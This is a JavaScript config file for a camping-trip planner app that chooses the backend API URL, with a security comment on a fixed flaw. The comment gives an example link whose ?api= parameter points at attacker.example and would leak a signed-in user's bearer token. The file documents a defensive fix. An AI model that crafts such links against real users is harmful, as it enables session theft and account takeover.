// Single source of truth for backend API base URL.
// Loaded before every other script so window.API_URL is always defined.
(function () {
  if (window.__trailpackConfigLoaded) return;
  window.__trailpackConfigLoaded = true;

  const host = window.location.hostname;
  const isLocalhost = host === 'localhost' || host === '127.0.0.1' || host === '';

  // Override via <meta name="trailpack-api" content="https://..."> for debugging.
  // Setting the meta tag means editing the served HTML, which you can only do
  // if you already control the page.
  const metaOverride = document.querySelector('meta[name="trailpack-api"]')?.content;

  // SECURITY: ?api= is honoured on localhost only.
  //
  // It used to apply everywhere, and app.js attaches the session token to every
  // request it sends to window.API_URL. So a link like
  //
  //   https://mytrailpack.netlify.app/dashboard.html?api=https://attacker.example
  //
  // sent to a signed-in user pointed the whole app at an attacker's host and
  // handed over their Authorization: Bearer token on the first request — an
  // account takeover from one click, with nothing to notice.
  //
  // Local development keeps the escape hatch, where the only token at risk is
  // the developer's own against their own backend.
  const queryOverride = isLocalhost
    ? new URLSearchParams(window.location.search).get('api')
    : null;

  const DEFAULT_LOCAL = 'http://localhost:3000';
  const DEFAULT_PROD = 'https://trailpack-smart-camping-trip-planner.onrender.com';

  window.API_URL = queryOverride || metaOverride || (isLocalhost ? DEFAULT_LOCAL : DEFAULT_PROD);
})();
